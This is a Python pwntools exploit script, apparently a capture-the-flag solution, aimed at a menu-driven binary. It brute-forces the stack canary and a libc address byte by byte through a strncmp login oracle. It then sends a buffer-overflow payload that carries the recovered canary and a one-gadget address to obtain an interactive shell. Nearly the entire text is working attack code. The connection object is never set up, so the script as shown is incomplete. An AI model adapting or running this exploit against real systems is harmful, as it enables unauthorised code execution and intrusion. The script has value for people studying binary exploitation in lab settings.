from pwn import *
import struct

context.log_level = 'info'

canary = ''
libc = 'bbbbbbbb'

def menu(idx):
    io.recvuntil('>> ')
    io.sendline(str(idx))

def login(ca):
    menu(1)
    io.recvuntil(':')
    io.send(ca)
    succeess = io.recvline()     
    if 'Success' in succeess:
        return True
    else:
        return False
         
# brute the canary byte by byte because strlen will stop by \x00
# and it used strncmp
def brute_canary():
    global canary
    for i in range(0, 16):
        for i in range(1, 255):
            tmp = canary + chr(i)
            ret = login(tmp + '\x00')
            if ret == True:
                canary += chr(i)
                menu(1)
                print 'success 1byte'
                break
    print canary.encode('hex')

def brute_libc():
    global libc
    for i in range(0, 5):
        for i in range(1, 255):
            tmp = libc + chr(i)
            ret = login(tmp + '\x00')
            if ret == True:
                libc += chr(i)
                menu(1)
                break
    print libc.encode('hex')

brute_canary()

login('\x00' + 'a' * 0x3f + 'b' * 8)
menu(3) # copy to overflow the canary with the libc addr in &s which isin func login
io.recvuntil(':')
io.send('c' * 0x3f)
menu(1)
brute_libc()
libc_addr = u64((libc[8:] + '\x7f').ljust(8, '\x00'))
log.info('libc_addr :' + hex(libc_addr))
libc_main = libc_addr - 0x7fab9817e439 + 0x00007fab98106000
log.info('libc_main :' + hex(libc_main))

one = libc_main + 0xf0567

menu(1)
io.recvuntil(':')
payload = '\x00'
payload += 'a' * 0x3f
payload += canary # pass the memcmp
payload += 'b' * (104 - len(payload))
payload += p64(one) # one gadget to trigger the shell
io.send(payload)

menu(3)
io.recvuntil(':')
pause()
io.send('c' * 0x3f)
io.recvuntil('>> ')
io.send('2')

io.interactive()

# so in s of the read_n_bytes(&s, 0x7Fu); there are libc_addr
# when we copy it to copy(&v6);
# the libc addr will exactly overwrite the canary in stack
# and use the same way we brute the canary
# we can brute the libc_addr out
